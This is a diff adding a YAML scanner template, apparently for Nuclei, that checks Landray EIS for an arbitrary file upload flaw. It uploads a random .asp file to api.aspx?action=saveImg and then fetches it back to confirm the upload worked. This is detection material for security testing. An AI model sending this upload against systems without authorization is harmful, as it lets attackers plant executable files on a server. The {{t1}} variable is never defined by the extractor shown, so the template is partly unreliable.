@@ -1,0 +1,51 @@
+id: landray-eis-apiaspx-anyfile-upload
+info:
+  name: Landray EIS API.aspx Arbitrary File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+variables:
+  filename: "{{rand_base(6)}}"
+  content: "{{rand_base(32)}}"
+  rboundary: "{{rand_base(8)}}"
+http:
+  - raw:
+      - |+
+        POST /eis/service/api.aspx?action=saveImg HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="file"; filename="{{filename}}.asp"
+        Content-Type: text/html
+
+        {{content}}
+        ------WebKitFormBoundary{{rboundary}}--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "/files/editor_img"
+    extractors:
+      - type: regex
+        group: 0
+        regex:
+          - "/files/editor_img(.*)"
+        internal: true
+  - raw:
+      - |+
+        GET /files/editor_img{{t1}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{content}}"
